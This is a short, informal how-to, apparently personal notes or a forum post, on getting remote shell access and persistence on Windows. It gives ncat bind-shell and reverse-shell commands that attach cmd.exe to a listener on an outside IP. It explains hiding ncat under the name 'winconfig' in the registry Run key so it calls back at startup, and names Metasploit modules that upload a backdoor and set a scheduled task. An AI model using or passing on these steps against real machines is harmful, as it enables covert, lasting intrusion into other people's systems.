you can use ncat in a similar way to nc -e with. ncat -l -p 2121 -e cmd.exe for bind shell. or ncat -e cmd.exe IP PORT for reverse shell.

To get PERSISTENCE with ncat we can add a command key to the registry.

setup a listener on your machine.

in regedit, goto HKEY_LOCAL_MACHNE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run. Rightclik>New>String Value

set name is something like winconfig to hide ncat and set value as the path to the file and ip and port and -e to connect.eg "C:\Windows\System32\winconfig.exe 192.168.1.1 2121 -e cmd.exe"
this will run ncat at startup

this can be done through metasploit also and meterpreter to get more features than ncat.

in metasploit the s4u_persistence module gets persistence using an existing session to upload a backdoor and set scheduled task. so you can now startup a new listener and catch the reverse shell when its triggered.

there are various persistence modules, one main one for windows is windows/local/persistence but you have to change the lport to be different to the sessions lport.
